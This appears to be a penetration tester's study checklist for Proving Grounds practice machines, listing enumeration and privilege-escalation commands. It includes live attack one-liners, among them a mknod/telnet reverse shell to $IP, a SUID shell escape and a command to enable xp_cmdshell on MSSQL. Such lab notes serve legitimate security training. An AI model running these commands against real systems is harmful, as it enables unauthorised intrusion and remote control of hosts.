## Generic check list / review based off PG Practice Machines

#### enumeration / intel
- Does the hostname give any clues
- Do exploits open up ports & can you connect to them [nc -nv]
- Are there default creds
- Attempt simple login creds
- Are there LFI possibilities
  - Can you read files
  - Can you transfer files [multi stage PHP transfer of shells]
- Are there RFI possibilities
  - index.php?page=http:// 
- Consider lesser used tools
  - sparta
  - feroxbuster
  - dirsearch.py
  - gcore
  - strings
  - ident-user-enum
  - whatweb
- sudo perl smtp-user-enum.pl -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
- cewl -d 5 -m 3 http://website.com/teampage -w cewl.txt
- Any users, keys, or passwords in FTP files
- smbmap -u null -p null -H <IP> -s Scripting$ -R
- MSSQL & enable_xp_cmdshell
  - sudo python3 mssqlclient.py -port 1435 sa:password55@$(cat ip)
- nmap include scripts and exclude brute [nmap -n -sV --script "ldap* and not brute"]
- LDAP users
  - ldapsearch -x -h $IP -D '' -w '' -b "DC=domain,DC=local" | grep sAMAccountName
- IRC open = hexchat

#### privilege Escalation
  
- Can you escalate priv from SUID [find . -exec /bin/sh -p \; -quit]
- Do you have creds
  - sudo -l
- docker image ls
- Any scripts being used in auto or cron jobs
- GTFO
- fdisk -l [can you mount any]
- chmod 600 id_rsa
- scp for transfer
- mknod a p && telnet $IP 443 0<a | /bin/sh 1>a
- Unquoted paths
- psexec.py
- Get-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file c:\users\scripting\logs.txt 

